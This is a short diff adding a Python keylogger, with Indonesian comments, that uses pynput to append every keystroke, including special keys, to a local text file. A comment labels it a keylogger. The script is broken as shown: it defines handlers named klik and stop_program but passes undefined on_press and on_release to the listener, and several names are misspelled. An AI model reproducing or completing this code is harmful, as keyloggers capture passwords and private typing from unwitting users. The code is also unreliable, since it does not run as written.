@@ -1,0 +1,21 @@
+import pynput 
+from pynput import keyboard
+
+OUTPUT = "otput.txt"
+
+# Fungsi untuk menangani penekanan tombol
+def klik(key):
+    try:
+        with open(OUTPUT, "a") as file:
+            file.write(f"{key.char}")
+    except AttributeError:
+        with open(OUTPUT, "a") as file:
+            file.write(f" [{key}] ")
+
+def stop_program(key):
+    if key == keyboard.Key.esc:
+        return False
+
+# listener recording buat anu, keyloggrer nyah
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
